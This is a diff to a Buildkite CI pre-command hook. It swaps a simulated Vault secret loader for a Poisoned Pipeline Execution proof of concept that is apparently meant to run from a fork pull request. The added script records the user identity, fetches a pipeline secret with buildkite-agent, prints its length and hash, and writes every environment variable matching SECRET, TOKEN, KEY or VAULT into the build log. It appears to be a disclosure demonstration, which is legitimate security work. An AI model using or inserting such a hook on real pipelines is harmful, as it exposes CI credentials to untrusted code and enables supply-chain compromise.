@@ -1,7 +1,41 @@
 #!/bin/bash
-echo "--- [ORIGINAL] pre-command hook executing"
-echo "HOOK_SOURCE=main_branch"
-echo "This hook simulates Vault secret loading"
-echo "Loading VAULT_ADDR_SECRET from kv/ci-shared/release/dra-role..."
-export SIMULATED_VAULT_SECRET="original-secret-value-from-vault"
-echo "Secrets loaded successfully"
+echo "--- [MODIFIED BY PR] pre-command hook executing (Build #4)"
+echo "HOOK_SOURCE=pull_request_branch"
+echo "This hook was MODIFIED in the PR - demonstrating Poisoned Pipeline Execution"
+echo ""
+echo "--- System access level:"
+echo "whoami: $(whoami)"
+echo "id: $(id)"
+echo ""
+echo "--- PIPELINE SECRET ACCESS TEST:"
+echo "Attempting to retrieve pipeline secret via buildkite-agent..."
+SECRET_VALUE=$(buildkite-agent secret get SIMULATED_VAULT_SECRET 2>&1)
+SECRET_EXIT=$?
+echo "Exit code: $SECRET_EXIT"
+if [ $SECRET_EXIT -eq 0 ] && [ -n "$SECRET_VALUE" ]; then
+    echo "RESULT: SECRET SUCCESSFULLY RETRIEVED BY FORK PR HOOK"
+    echo "SECRET_LENGTH: ${#SECRET_VALUE}"
+    echo "SECRET_SHA256: $(echo -n "$SECRET_VALUE" | sha256sum | cut -d' ' -f1)"
+    echo ""
+    echo "This proves pipeline-level secrets are accessible to fork PR code."
+    echo "On Elastic infra, Vault secrets would be equally accessible."
+else
+    echo "buildkite-agent secret get output: $SECRET_VALUE"
+    echo "Trying direct env var access..."
+    if [ -n "$SIMULATED_VAULT_SECRET" ]; then
+        echo "RESULT: SECRET FOUND AS ENV VAR"
+        echo "SECRET_LENGTH: ${#SIMULATED_VAULT_SECRET}"
+    else
+        echo "RESULT: Not available as env var either"
+    fi
+fi
+echo ""
+echo "--- All environment variables matching SECRET/TOKEN/KEY patterns:"
+env | grep -iE '(SECRET|TOKEN|KEY|VAULT)' | sort
+echo ""
+echo "--- Buildkite metadata:"
+echo "BUILDKITE_PULL_REQUEST: $BUILDKITE_PULL_REQUEST"
+echo "BUILDKITE_PULL_REQUEST_REPO: $BUILDKITE_PULL_REQUEST_REPO"
+echo "BUILDKITE_REDACTED_VARS: $BUILDKITE_REDACTED_VARS"
+echo ""
+echo "--- PPE PROOF: Attacker-modified hook executed with pipeline secret access"
